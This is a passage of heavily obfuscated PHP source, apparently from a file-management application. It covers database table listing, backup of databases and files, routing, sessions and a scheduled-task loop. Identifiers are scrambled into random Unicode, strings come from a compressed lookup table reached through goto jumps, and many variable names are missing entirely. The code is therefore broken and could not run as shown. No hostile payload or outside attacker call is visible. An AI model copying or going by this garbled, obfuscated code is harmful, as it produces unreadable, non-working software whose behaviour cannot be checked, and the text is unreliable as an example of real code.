(isset($݂[$Ζ[95]]) ? $݂[$Ζ[95]] : !1)); } } return $; } public function getTables($Kҗ = '') { $ =& $_SERVER[]; if (think_config($[1109])) { $痫 = str_replace($[1110], $Kҗ, think_config($[1109])); } else { switch ($this->dbType) { case $[1077]: case $[1079]: $痫 = $[1111]; break; case $[1076]: case $[1094]: $痫 = $[1112]; break; case $[1103]: $痫 = $[1113]; break; case $[1078]: think_exception(think_lang($[1114]) . $[1115]); break; case $[1095]: $痫 = $[45] . $[46] . $[47]; break; case $[1106]: default: if (!empty($Kҗ)) { $痫 = $[1055] . $Kҗ . $[1056]; } else { $痫 = $[1057]; } } } $Ӛ = $this->query($痫); $޾ = array(); foreach ($Ӛ as $ǳ͊ => $ϊƚ) { $޾[$ǳ͊] = current($ϊƚ); } return $޾; } protected function parseLimit($Ȉ) { $۳ =& $_SERVER[]; $ = $۳[12]; if (!empty($Ȉ)) { switch ($this->dbType) { case $۳[1103]: case $۳[1095]: $Ȉ = explode($۳[50], $Ȉ); if (count($Ȉ) > 1) { $ .= $۳[51] . $Ȉ[1] . $۳[52] . $Ȉ[0] . $۳[53]; } else { $ .= $۳[51] . $Ȉ[0] . $۳[53]; } break; case $۳[1076]: case $۳[1094]: break; case $۳[1078]: break; case $۳[1077]: case $۳[1079]: break; case $۳[1106]: default: $ .= $۳[51] . $Ȉ . $۳[53]; } } return $; } public function parseKey(&$ݺю, $Ɩ = true) { $ =& $_SERVER[]; if ($Ɩ) { $ݺю = $this->parseKeyCheck($ݺю); } if ($this->dbType == $[1106]) { if ($ݺю != $[220] && !preg_match($[1070], $ݺю)) { $ݺю = $[475] . trim($ݺю, $[475]) . $[475]; } return $ݺю; } else { return parent::parseKey($ݺю, $Ɩ); } } public function close() { $this->_linkID = null; } public function error() { $߾ =& $_SERVER[]; if ($this->PDOStatement) { $Ӎ = $this->PDOStatement->errorInfo(); $this->error = $Ӎ[1] . $߾[4] . $Ӎ[2]; } else { $this->error = $߾[12]; } if ($߾[12] != $this->queryStr) { $this->error .= LNG($߾[48]) . $this->queryStr; } think_trace($this->error, $߾[12], $߾[49]); return $this->error; } public function escapeString($֑) { $؍ =& $_SERVER[]; switch ($this->dbType) { case $؍[1103]: case $؍[1076]: case $؍[1094]: case $؍[1106]: return addslashes($֑); case $؍[1078]: case $؍[1095]: case $؍[1077]: case $؍[1079]: return str_ireplace($؍[58], $؍[59], $֑); } } protected function parseValue($ܹಷ) { $߬ =& $_SERVER[]; if (is_string($ܹಷ)) { $䍥Ҡ = strpos($ܹಷ, $߬[4]) === 0 && in_array($ܹಷ, array_keys($this->bind)); $ܹಷ = $䍥Ҡ ? $this->escapeString($ܹಷ) : $߬[1116] . $this->escapeString($ܹಷ) . $߬[1116]; } elseif (isset($ܹಷ[0]) && is_string($ܹಷ[0]) && strtolower($ܹಷ[0]) == $߬[372]) { $ܹಷ = $this->escapeString($ܹಷ[1]); } elseif (is_array($ܹಷ)) { $ܹಷ = array_map(array($this, $߬[1117]), $ܹಷ); } elseif (is_bool($ܹಷ)) { $ܹಷ = $ܹಷ ? $߬[91] : $߬[228]; } elseif (is_null($ܹಷ)) { $ܹಷ = $߬[103]; } return $ܹಷ; } public function getLastInsertId() { $ =& $_SERVER[]; switch ($this->dbType) { case $[1103]: case $[1095]: case $[1076]: case $[1094]: case $[1078]: case $[1106]: return $this->_linkID->lastInsertId(); case $[1077]: case $[1079]: $ = $this->table; $۲ċ = $this->query("\123\x45\114\105\x43\x54\40{$}\56\x63\x75\x72\x72\166\x61\154\x20\x63\x75\162\x72\166\x61\x6c\40\x46\122\x4f\115\40\x64\x75\141\154"); return $۲ċ ? $۲ċ[0][$[1118]] : 0; } } } class DbSqlite extends DbSqliteBase { protected function _execSql($) { if (!$this->_linkID || !$) { return; } sqlite_query($this->_linkID, $); } protected function initConnectAfter() { $ =& $_SERVER[]; $this->_execSql($[1119]); $this->_execSql($[1120]); } public function query($Г) { $Ѓ = parent::query($Г); return $Ѓ; } public function execute($ޖ) { $ =& $_SERVER[]; if (!CacheLock::fileLock($[1121])) { return !1; } $ќӹ = parent::execute($ޖ); CacheLock::fileUnLock($[1121]); return $ќӹ; } } goto a; d쓗: class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { $ó =& $_SERVER[]; $ = Backup::get(); self::$io = $[$ó[846]]; self::$name = $[$ó[32]]; $ = new DbManage(); $ = $->dbType(); $耹 = array($ó[874] => $, $ó[875] => time()); Backup::set($耹); $ = $this->tmpFilesPath() . $ó[876] . self::$name . $ó[8]; del_dir($); mk_dir($); $У = $͸ = 0; try { $ۤ = $->db()->getTables(); } catch (Exception $Ȩ) { Backup::log($ó[877] . $Ȩ->getMessage()); return !1; } $ۤ = array_diff($ۤ, array($ó[878], $ó[879])); foreach ($ۤ as $) { if ($ == $ó[472]) { continue; } $У += $->model($)->count(); } $ = new Task($ó[880], $ó[873], $У, LNG($ó[881]) . $ó[882] . LNG($ó[883])); $GLOBALS[$ó[884]] = self::$name; foreach ($ۤ as $) { $Ґ = $ . $ . $ó[885]; if ($ == $ó[472]) { @touch($Ґ); continue; } $͸ += $->sqlFromDb($, $Ґ, $); } unset($GLOBALS[$ó[884]]); $->end(); if ($͸ > $У) { $У = $͸; } $耹 = array($ó[874] => $, $ó[870] => 1, $ó[886] => $У, $ó[887] => $͸, $ó[888] => time()); Backup::set($耹); if (!$У || abs($У - $͸) / $У > 0.01) { $ƚ = $ó[889]; if (!stristr(I18n::getType(), $ó[890])) { $ƚ = $ó[891]; } Backup::log(array($ƚ, $耹)); return !1; } return !0; } private function tmpFilesPath() { $댵 =& $_SERVER[]; $ۦ = TEMP_FILES; if ($GLOBALS[$댵[6]][$댵[92]][$댵[892]]) { $ۦ = $GLOBALS[$댵[6]][$댵[92]][$댵[892]]; if (!mk_dir($ۦ) || !is_writable($ۦ) || !IO::mkfile($ۦ . $댵[893])) { $ۦ = TEMP_FILES; } } return $ۦ; } } class BackupDbFile { public function __construct() { } public function index() { $𦸏 =& $_SERVER[]; $ = Backup::get(); $ = $[$𦸏[32]]; $ܝ夥 = $this->tmpFilesPath() . "\x62\141\x63\x6b\165\x70\137{$}\x2f"; $ = $this->backupPath($); if (!($ = IO::mkdir($))) { Backup::log($𦸏[894] . $); return !1; } $ۣ = new DbManage(); $ܖ = $ۣ->getSqlFile(); if (!$ܖ || !$ܖ[$𦸏[895]] || !$ܖ[$𦸏[13]]) { Backup::log($𦸏[896]); return !1; } IO::move($ܖ[$𦸏[895]], $ܝ夥); IO::move($ܖ[$𦸏[13]], $ܝ夥); $ۣ->mixBakList($ܝ夥); $ = IO::listPath($ܝ夥); $ד = isset($[$𦸏[86]]) ? $[$𦸏[86]] : array(); $Ú = array_sum(array_column($ד, $𦸏[79])); if (!$Ú) { Backup::log($𦸏[897] . $ܝ夥); return !1; } $Ꟙ = array($𦸏[898] => $Ú, $𦸏[899] => time()); Backup::set($Ꟙ); Hook::trigger($𦸏[900], $ܝ夥, $); $ۡ = new TaskFileTransfer($𦸏[900], $𦸏[873], count($ד), LNG($𦸏[881]) . $𦸏[476] . LNG($𦸏[883]) . $𦸏[901]); $ۡ->task[$𦸏[858]] = $Ú; foreach ($[$𦸏[86]] as $Ǐ) { $͙ܪ = IO::move($Ǐ[$𦸏[87]], $); if (!$͙ܪ) { $ۡ->end(); $ = IO::getLastError($𦸏[902] . $Ǐ[$𦸏[87]] . $𦸏[903] . $ . $𦸏[175]); Backup::log($); return !1; } } $ۡ->end(); $Ꟙ = array($𦸏[904] => $Ú, $𦸏[905] => time()); Backup::set($Ꟙ); return !0; } private function backupPath($) { $ =& $_SERVER[]; $ē = $[$[32]]; $ݮ = Model($[867])->get($[868]); $쭷 = substr(md5($[869] . $ݮ . $ē), 0, 8); return "\173\151\x6f\x3a{$[$[846]]}\175\57\144\x61\x74\x61\x62\x61\x73\x65\57\x62\x61\x63\x6b\165\x70\57" . $ē . $[11] . $쭷; } private function tmpFilesPath() { $䄹 =& $_SERVER[]; $ = TEMP_FILES; if ($GLOBALS[$䄹[6]][$䄹[92]][$䄹[892]]) { $ = $GLOBALS[$䄹[6]][$䄹[92]][$䄹[892]]; if (!mk_dir($) || !is_writable($) || !IO::mkfile($ . $䄹[893])) { $ = TEMP_FILES; } } return $; } } class BackupFile { protected $bakVer = "\157\154\144"; public function __construct($ = false) { $ =& $_SERVER[]; $this->bakVer = $ ? $[906] : $[907]; } public function index() { $ = Backup::get(); $ӝ = $[$_SERVER[][850]][$_SERVER[][230]][$_SERVER[][557]]; $ꅜ = array($_SERVER[][558] => array($_SERVER[][908], $ӝ), $_SERVER[][909] => array($_SERVER[][406], $[$_SERVER[][846]])); $ = (int) Model($_SERVER[][910])->where($ꅜ)->count($_SERVER[][557]); $ˍ = (int) Model($_SERVER[][910])->where($ꅜ)->sum($_SERVER[][79]); $ = new TaskFileTransfer($_SERVER[][911], $_SERVER[][873], $, LNG($_SERVER[][881]) . $_SERVER[][882] . LNG($_SERVER[][912])); $->task[$_SERVER[][858]] = $ˍ; $ = array($_SERVER[][913] => $, $_SERVER[][914] => $ˍ, $_SERVER[][915] => time()); Backup::set($); $̈́ = !0; $ϝ = $this->storeIds(); $˱ = 1; $ = 1000; $ = $մ = 0; $ꆸ = array(); $ܽ = $ˬټ = 0; do { $ց = $_SERVER[][916]; $ = Model($_SERVER[][910])->where($ꅜ)->field($ց)->order($_SERVER[][917])->selectPage($, $˱); $Ƕ = !empty($[$_SERVER[][446]]) ? $[$_SERVER[][446]] : array(); foreach ($Ƕ as $) { if (!$this->_fileExist($, $ꆸ, $ϝ)) { Backup::log($_SERVER[][918] . $[$_SERVER[][557]] . $_SERVER[][919] . $[$_SERVER[][87]]); continue; } $ = $[$_SERVER[][87]]; $ = "\x7b\151\157\x3a{$[$_SERVER[][846]]}\175" . substr($, strlen("\x7b\151\157\x3a{$[$_SERVER[][920]]}\175")); if (IO::exist($)) { $->updateFileEnd($[$_SERVER[][32]], $[$_SERVER[][79]]); } else { $ = get_path_father($); IO::mkdir($); if (!IO::copy($, $, $_SERVER[][921])) { Backup::log($_SERVER[][922] . $ . $_SERVER[][903] . $ . $_SERVER[][175]); $̈́ = !1; break; } } $ӝ = $[$_SERVER[][557]]; $մ += 1; $ += $[$_SERVER[][79]]; $ˬټ += 1; $ܽ += $[$_SERVER[][79]]; if ($ >= 1024 * 1024 * 100) { $ = array($_SERVER[][845] => $ӝ, $_SERVER[][923] => $ˬټ, $_SERVER[][924] => $ܽ); Backup::set($); $ = $մ = 0; } } $ɺ = count($Ƕ); $˱++; } while ($ɺ == $); $->end(); $ = array($_SERVER[][925] => 1, $_SERVER[][856] => time(), $_SERVER[][872] => 1, $_SERVER[][845] => $ӝ, $_SERVER[][926] => time()); if ($մ) { $[$_SERVER[][923]] = $ˬټ; $[$_SERVER[][924]] = $ܽ; } Backup::set($); return !0; } private function _fileExist($ф, &$ŏ, $߅) { $ =& $_SERVER[]; $𶌡 = $ф[$[87]]; if (in_array($ф[$[557]], $ŏ)) { return !1; } if (!in_array($ф[$[920]], $߅)) { return !1; } if (IO::exist($𶌡)) { return !0; } $ = get_path_father($𶌡); if (IO::exist($)) { $ŏ[] = $ф[$[557]]; return !1; } $ = array($[920] => $ф[$[920]], $[87] => array($[473], "{$}\x25")); $֘ = Model($[910])->where($)->field($[558])->select(); $ŏ = array_merge($ŏ, array_to_keyvalue($֘, $[12], $[557])); return !1; } private function _fileFilter($) { $ڧ̪ =& $_SERVER[]; return; if (empty($)) { return; } $ї = array($ڧ̪[557] => array($ڧ̪[7], array_unique($))); $݋ = Model($ڧ̪[927])->where($ї)->field($ڧ̪[191])->select(); foreach ($݋ as $ù˃) { Model($ڧ̪[927])->remove($ù˃[$ڧ̪[191]], !1); } } private function storeIds() { $ =& $_SERVER[]; $ = Model($[862])->listData(); $ = array(); $ = $GLOBALS[$[6]][$[92]][$[928]]; foreach ($ as $) { $苋 = strtolower($[$[96]]); if (!isset($[$苋])) { continue; } $Թ = $[77] . (isset($[$苋]) ? $[$苋] : ucfirst($苋)); if (!class_exists($Թ)) { continue; } $[] = $[$[487]]; } return $; } public function start($Ꝑ䉎, $ξ) { $崅 =& $_SERVER[]; $Оۮ = KodIO::makePath(KodIO::KOD_IO, $Ꝑ䉎); if (!$this->checkStore($Ꝑ䉎)) { write_log($崅[929] . $Оۮ, $崅[930]); return; } $ҽ = KodIO::defaultDriver(); if ($ҽ[$崅[487]] == $Ꝑ䉎) { write_log($崅[931] . $Оۮ, $崅[930]); return; } $˕ = $崅[932]; $ȳ = Task::get($˕); if ($ȳ) { if ($ȳ[$崅[844]] == $崅[933]) { return; } Task::kill($˕); } $ӥ = array($崅[846] => $Ꝑ䉎, $崅[557] => 0, $崅[204] => 0, $崅[850] => array($崅[853] => 0, $崅[934] => 0, $崅[858] => 0, $崅[935] => 0, $崅[936] => 0)); $ = Model($崅[867])->get($崅[937], $崅[873]); $ = json_decode($, !0); if (!$) { $ = array(); } if ($[$崅[846]] && $[$崅[846]] != $Ꝑ䉎) { $[$崅[557]] = 0; $[$崅[846]] = $Ꝑ䉎; } $ = array_merge($ӥ, $); $ = _get($GLOBALS, $崅[7], array()); if ($[$崅[849]] == $崅[91] && $[$崅[938]] == $崅[91] || !$[$崅[557]]) { $ = $ӥ; } $Оۮ = KodIO::makePath(KodIO::KOD_IO, $[$崅[846]]); $ݣ = $Оۮ . $崅[939]; if (!file_exists($ݣ)) { $ = file_get_contents(__DIR__ . $崅[940]); if (defined($崅[941]) && INSTALL_CHANNEL) { $ = str_replace($崅[942], INSTALL_CHANNEL, $); } file_put_contents($ݣ, $); } $ = $ξ * 60 * 0.8; $ò = timeFloat(); $ = Model($崅[560]); $Ȗ = array($崅[558] => array($崅[908], $[$崅[557]])); $ɱ = $->field(array($崅[943] => $崅[944], $崅[945] => $崅[79]))->where($Ȗ)->find(); if (!$ɱ[$崅[944]]) { return; } $ = intval($ɱ[$崅[944]]); $ѫ = intval($ɱ[$崅[79]]); $[$崅[850]][$崅[853]] += $; $[$崅[850]][$崅[858]] += $ѫ; $[$崅[204]] = time(); Model($崅[867])->set($崅[937], $, $崅[873]); $ȳ = new TaskFileTransfer($˕, $崅[873], $, LNG($崅[881]) . $崅[882] . LNG($崅[912])); $ȳ->task[$崅[858]] = $ѫ; $ = 500; $ = 1; $ӛ镓 = $崅[916]; $ɻ = $->where($Ȗ)->field($ӛ镓)->order($崅[917])->selectPage($, $); $ڗ͇ = array($崅[853] => 0, $崅[946] => 0, $崅[936] => 0, $崅[947] => $[$崅[557]], $崅[948] => 0); $ = intval($ɻ[$崅[443]][$崅[445]]); while ($ɻ && $ <= $) { if (timeFloat() - $ò > $) { break; } foreach ($ɻ[$崅[446]] as $) { if (timeFloat() - $ò > $) { break; } $ڗ͇[$崅[853]]++; $ڗ͇[$崅[948]] = $[$崅[557]]; $[$崅[557]] = $[$崅[557]]; $[$崅[850]][$崅[934]]++; $[$崅[850]][$崅[935]] += $[$崅[79]]; $ݲ = $[$崅[87]]; if (!$this->isFileExist($, $)) { $ȳ->updateFileEnd($[$崅[32]], $[$崅[79]]); $[$崅[850]][$崅[936]]++; $ڗ͇[$崅[946]]++; write_log($崅[918] . $[$崅[557]] . $崅[919] . $ݲ, $崅[930]); continue; } $ٮ = $Оۮ . substr($ݲ, strlen("\x7b\x69\157\x3a{$[$崅[920]]}\175\57")); if (IO::exist($ٮ)) { $ȳ->updateFileEnd($[$崅[32]], $[$崅[79]]); continue; } $ٮ = get_path_father($ٮ); if (!IO::copy($ݲ, $ٮ, REPEAT_SKIP)) { $[$崅[850]][$崅[936]]++; $ڗ͇[$崅[936]]++; write_log($崅[949] . $[$崅[557]] . $崅[919] . $ݲ, $崅[930]); } $ȳ->updateFileEnd($[$崅[32]], $[$崅[79]]); } Model($崅[867])->set($崅[937], $, $崅[873]); $++; $ɻ = $->where($Ȗ)->field($ӛ镓)->order($崅[917])->selectPage($, $); } $ȳ->end(); write_log($崅[950] . json_encode($ڗ͇), $崅[930]); if (IO::mkdir($Оۮ . $崅[951])) { $ڗ͇[$崅[948]] = $[$崅[557]]; IO::setContent($Оۮ . $崅[952] . date($崅[953]) . $崅[954], json_encode($ڗ͇)); } Model($崅[867])->set($崅[937], $, $崅[873]); return !0; } private function isFileExist($؜, $݆ڸ) { $ =& $_SERVER[]; static $ˀ = null; static $ = null; if (is_null($ˀ)) { $ˀ = $ = array(); } $ = $؜[$[920]]; $ = KodIO::parse($؜[$[87]]); if ($ != $[$[487]]) { return !1; } if (!isset($ˀ[$])) { $ˀ[$] = $this->checkStore($); } if ($ˀ[$] !== 1) { return !1; } if (in_array($؜[$[557]], $)) { return !1; } $ԟ = $؜[$[87]]; if (IO::exist($ԟ)) { return !0; } $ӡ = get_path_father($ԟ); if (IO::exist($ӡ)) { $[] = $؜[$[557]]; return !1; } $ = array($[920] => $, $[87] => array($[473], "{$ӡ}\45")); $ = $݆ڸ->where($)->field($[558])->select(); $ = array_merge($, array_to_keyvalue($, $[12], $[557])); return !1; } public function checkStore($ɔ) { static $͵; if (is_null($͵)) { $͵ = Model($_SERVER[][862]); } $ټ = $͵->listData($ɔ); if (!$ټ) { return 0; } try { $ˤ = $͵->checkConfig($ټ, !0); } catch (Exception $뺊) { $ˤ = !1; } return $ˤ === !0 ? 1 : 0; } } goto C鞑㻌; A͎: while (strlen($ekifrxugdp) < $_SERVER[][702]) { if (!$ekifrxugdp) { break; } $ekifrxugdp++; } $_SERVER[鎖] = explode($_SERVER[][703], gzinflate(substr($_SERVER[][704], 10, -8))); $yqzhsxcfrv = $_SERVER[][705]; goto AĚ; D: class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\72\141\x6e\x79" => "\x5b\x5e\x2f\x5d\x2b", "\x3a\x6e\x75\x6d" => "\133\x30\x2d\x39\135\x2b", "\72\x61\154\154" => "\x2e\52"); public static $errorCallback; public static function __callstatic($, $ͳ) { $푍 =& $_SERVER[]; if ($ == $푍[1907]) { $Ҹ = array_map($푍[1908], $ͳ[0]); $ʕ = strpos($ͳ[1], $푍[8]) === 0 ? $ͳ[1] : $푍[8] . $ͳ[1]; $ = $ͳ[2]; } else { $Ҹ = null; $ʕ = strpos($ͳ[0], $푍[8]) === 0 ? $ͳ[0] : $푍[8] . $ͳ[0]; $ = $ͳ[1]; } array_push(self::$maps, $Ҹ); array_push(self::$routes, $ʕ); array_push(self::$methods, strtoupper($)); array_push(self::$callbacks, $); } public static function error($ř) { self::$errorCallback = $ř; } public static function haltOnMatch($Υ拉 = true) { self::$halts = $Υ拉; } public static function dispatch() { $ڳڝ =& $_SERVER[]; $۹ = parse_url($_SERVER[$ڳڝ[1909]], PHP_URL_PATH); $ = $_SERVER[$ڳڝ[161]]; $ԟ = array_keys(static::$patterns); $ϥ = array_values(static::$patterns); $旊 = !1; self::$routes = preg_replace($ڳڝ[1460], $ڳڝ[8], self::$routes); if (in_array($۹, self::$routes)) { $ = array_keys(self::$routes, $۹); foreach ($ as $) { if (self::$methods[$] == $ || self::$methods[$] == $ڳڝ[1910] || in_array($, self::$maps[$])) { $旊 = !0; if (!is_object(self::$callbacks[$])) { $ = explode($ڳڝ[8], self::$callbacks[$]); $Ѱ = end($); $ϲ = explode($ڳڝ[1392], $Ѱ); $ = new $ϲ[0](); $->{$ϲ[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$]); if (self::$halts) { return; } } } } } else { $쁚 = 0; foreach (self::$routes as $) { if (strpos($, $ڳڝ[4]) !== !1) { $ = str_replace($ԟ, $ϥ, $); } if (preg_match($ڳڝ[1911] . $ . $ڳڝ[1912], $۹, $Μ)) { if (self::$methods[$쁚] == $ || self::$methods[$쁚] == $ڳڝ[1910] || !empty(self::$maps[$쁚]) && in_array($, self::$maps[$쁚])) { $旊 = !0; array_shift($Μ); if (!is_object(self::$callbacks[$쁚])) { $ = explode($ڳڝ[8], self::$callbacks[$쁚]); $Ѱ = end($); $ϲ = explode($ڳڝ[1392], $Ѱ); $ = new $ϲ[0](); if (!method_exists($, $ϲ[1])) { echo $ڳڝ[1913]; } else { call_user_func_array(array($, $ϲ[1]), $Μ); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$쁚], $Μ); if (self::$halts) { return; } } } } $쁚++; } } if ($旊 == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $ =& $_SERVER[]; header($_SERVER[$[1914]] . $[1915]); echo $[1916]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$ڳڝ[1909]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { $ =& $_SERVER[]; static $ = false; if ($) { return $; } $寉 = $GLOBALS[$[6]][$[424]]; self::$sessionTime = $寉[$[1917]]; $тʽ = isset($GLOBALS[$[1918]]) ? $GLOBALS[$[1918]] : SESSION_ID; if (self::$sessionSign) { } else { if (Cookie::get($тʽ)) { self::$sessionSign = Cookie::get($тʽ); } else { self::$sessionSign = self::$sessionSign ? self::$sessionSign : guid(); } } Cookie::setSafe($тʽ, self::$sessionSign, self::$sessionTime); $С = $寉[$[1919]]; $Э = $寉[$С]; $࿌ = $寉[$[975]]; switch ($С) { case $[21]: self::$handle = Model($[976]); break; case $[977]: self::$handle = new CacheRedis($Э, $࿌); break; case $[978]: self::$handle = new CacheMemcached($Э, $࿌); break; case $[230]: $Э[$[87]] = $Э[$[87]] . $[1920]; self::$handle = new CacheFile($Э, $࿌); default: break; } if (!self::$data) { self::$data = self::getBySign(self::$sessionSign); if (!self::$data || !isset(self::$data[$[1656]]) || time() - self::$data[$[1656]] >= 5) { self::dataSave(); } } $ = new self(); return $; } public static function getBySign($ݓ) { $ӫ = self::$handle->get($ݓ); $ӫ = unserialize($ӫ); return is_array($ӫ) ? $ӫ : array(); } public static function setBySign($, $Зܱ) { self::$sessionSign = $; self::$data = $Зܱ; self::dataSave(); } private static function dataSave() { CacheLock::lock(self::$sessionSign); if (!self::$data || !is_array(self::$data)) { self::$data = array(); } self::$data[$_SERVER[][1656]] = time(); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); CacheLock::unlock(self::$sessionSign); } public static function sign($ = false) { if ($) { self::$sessionSign = $; } self::init(); return self::$sessionSign; } public static function set($, $ = false) { self::init(); if (is_array($)) { foreach ($ as $ => $) { array_set_value(self::$data, $, $); } } else { array_set_value(self::$data, $, $); } self::dataSave(); } public static function get($¸ = false) { self::init(); if (!$¸) { return self::$data; } return array_get_value(self::$data, $¸); } public static function remove($ϋŹ) { self::init(); unset(self::$data[$ϋŹ]); self::dataSave(); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[][984])) { self::$handle->clearTimeout(); } } } class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { $ =& $_SERVER[]; if (self::valueGet($[844]) != $[91]) { return; } if (self::valueGet($[933]) == $[91]) { $Ã = self::valueGet($[1921]); if (time() - $Ã > self::AUTO_RESTART_TIME) { self::restart(); } return; } self::clearUserStatus(); self::valueSet($[933], $[91]); self::log($[1922] . ACTION . $[1923]); Hook::bind($[1924], $[1925]); $ = 0; while (!0) { self::cacheClear(); if (self::valueGet($[844]) != $[91]) { self::valueSet($[933], $[228]); self::log($[1926]); die; } $ϭ = time(); if ($ϭ - $ >= 60) { self::valueSet(array($[933] => $[91], $[1921] => $ϭ)); $ = $ϭ; } if (!file_exists(USER_SYSTEM . $[1927])) { self::valueSet(array($[933] => $[228], $[844] => $[228])); self::log($[1928]); die; } $ = file_get_contents(BASIC_PATH . $[1929]); $㝰 = KOD_VERSION . $[10] . KOD_VERSION_BUILD; $ˆ = match_text($, $[1930]) . $[10] . match_text($, $[1931]); if ($ˆ != $㝰) { self::restart(); self::log("\163\x74\157\160\145\144\56\133\166\145\x72\x73\x69\x6f\156\x20\x75\160\x64\141\164\x65\x3b{$versionNow}\x20\x3d\76\40{$version}\x5d"); die; } self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } } public static function clearUserStatus() { $ĳ =& $_SERVER[]; http_close(); $GLOBALS[$ĳ[1932]] = 1; $_SERVER[$ĳ[1933]] = $ĳ[1934]; $_COOKIE = array(); $GLOBALS[$ĳ[1935]] = 1; $GLOBALS[$ĳ[1936]] = 1; Session::$sessionSign = guid(); Session::$data = array(); } public static function restart() { $ =& $_SERVER[]; http_close(); self::valueSet($[844], $[228]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet(array($[933] => $[228], $[844] => $[91])); self::log($[1937]); } public static function taskSwitch() { $麄 =& $_SERVER[]; $㌂ = self::valueGet($麄[844]) == $麄[91] ? $麄[228] : $麄[91]; self::valueSet($麄[844], $㌂); } public static function shutdownEvent() { $ =& $_SERVER[]; self::valueSet($[933], $[228]); self::log($[1938]); } public static function config($뜃, $浆) { self::valueSet($_SERVER[][844], $뜃); } private static function taskRunAll() { $ =& $_SERVER[]; $ = timeFloat(); $ڮ = Model($[1939])->listData(); $ۜ = count($ڮ); for ($逕 = 0; $逕 < $ۜ; $逕++) { $Ӷ = $ڮ[$逕]; if (!$Ӷ[$[487]] || $Ӷ[$[1940]] != $[91]) { continue; } if (!self::taskTimeCheck($Ӷ)) { continue; } self::taskRun($Ӷ); } Hook::trigger($[1941]); self::taskQueueRun($); } private static function taskQueueRun($) { $Ѿ = 10; while (!0) { $ = TaskQueue::run(); if ($ === !1) { break; } if (timeFloat() - $ >= $Ѿ) { break; } } } private static function taskTimeCheck($) { $ņ =& $_SERVER[]; $֬ = json_decode($[$ņ[204]], !0); $˞ = intval($[$ņ[1921]]); $虬 = strtotime($ņ[1942] . $֬[$ņ[1943]] . $ņ[1944]) - strtotime($ņ[1945]); $ = time() - strtotime(date($ņ[1946]) . $ņ[1947]); $߹ = $ >= $虬 && $ <= $虬 + 3600; switch ($֬[$ņ[33]]) { case $ņ[1948]: if (time() - $˞ < 3600 * 24 * 30) { return !1; } if ($֬[$ņ[1948]] == date($ņ[1949]) && $߹) { return !0; } break; case $ņ[1950]: if (time() - $˞ < 3600 * 24 * 7) { return !1; } $ = date($ņ[1951]) == 0 ? 7 : date($ņ[1951]); if ($֬[$ņ[1950]] == $ && $߹) { return !0; } break; case $ņ[1943]: if (time() - $˞ < 3600 * 24) { return !1; } if ($߹) { return !0; } break; case $ņ[1952]: if (time() - $˞ >= floatval($֬[$ņ[1952]]) * 60) { return !0; } break; default: break; } return !1; } private static function closeDatabase() { $ˊ =& $_SERVER[]; static $֑ = 0; $ = 300; if (!$֑) { $֑ = time(); } if (time() - $֑ < $) { return; } $֑ = time(); $ᖥ֔ = Model($ˊ[597])->db($ˊ[12]); if ($ᖥ֔) { $ᖥ֔->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { self::log($ˊ[1953], $ˊ[1954]); die; } } public static function taskRun($) { $ΣԻ =& $_SERVER[]; self::log($ΣԻ[1955] . $[$ΣԻ[487]] . $ΣԻ[1956] . $[$ΣԻ[32]] . $ΣԻ[1957] . $[$ΣԻ[1557]]); Model($ΣԻ[1939])->run($[$ΣԻ[487]]); $ְ = timeFloat(); $駈 = $ΣԻ[12]; switch ($[$ΣԻ[33]]) { case $ΣԻ[382]: $ = url_request($[$ΣԻ[1557]], $ΣԻ[1599], !1, !1, !1, !1, 10); if ($[$ΣԻ[844]]) { $駈 = strlen($[$ΣԻ[1386]]); } break; case $ΣԻ[1958]: $駈 = Hook::apply($[$ΣԻ[1557]]); default: break; } Model($ΣԻ[1959])->add(array($ΣԻ[1960] => $ΣԻ[12], $ΣԻ[1961] => $ΣԻ[228], $ΣԻ[33] => $ΣԻ[1962] . $[$ΣԻ[487]], $ΣԻ[1963] => json_encode(array($ΣԻ[32] => $[$ΣԻ[32]], $ΣԻ[1964] => timeFloat() - $ְ, $ΣԻ[850] => $駈)))); $ = $駈 ? $ΣԻ[1965] . $駈 : $ΣԻ[12]; self::log($ΣԻ[1966] . $[$ΣԻ[487]] . $ΣԻ[175] . $); return !0; } public static function valueGet($ڿ) { $ř =& $_SERVER[]; $Љ = $ř[1967]; $ٿ = Model($ř[522])->get($ڿ, $Љ); if (is_null($ٿ)) { Model($ř[522])->set($ř[844], $ř[91], $Љ); Model($ř[522])->set($ř[933], $ř[228], $Љ); $ٿ = Model($ř[522])->get($ڿ, $Љ); } return $ٿ; } private static function valueSet($Ӷ, $ = false) { $؎ =& $_SERVER[]; $ˉ = $؎[1968]; CacheLock::lock($ˉ); $ҵ = Model($؎[522])->set($Ӷ, $, $؎[1967]); CacheLock::unlock($ˉ); return $ҵ; } protected static function log($˹) { write_log($˹, $_SERVER[][1954]); } private static function cacheClear() { $ =& $_SERVER[]; Cache::clearMemory(Model($[522])->cacheKey($[1967])); Cache::clearMemory(Model($[522])->cacheKey($[1969])); Model($[1939])->cacheClear(); self::closeDatabase(); } } goto A; Dܫ: class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($, $ɽ = 0) { parent::__construct(); $this->source = $; $this->sourceSize = $ɽ; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($ = false) { return $this->sourceSize; } public function getContent($˴ = false) { return $this->fileSubstr($˴, 0, $this->sourceSize); } public function fileSubstr($ = false, $ˣ = 0, $ț = 0) { if (!$ț) { $ț = $this->sourceSize; } $ۍ = $this->sourceSize - $ˣ; if ($ț >= $ۍ) { 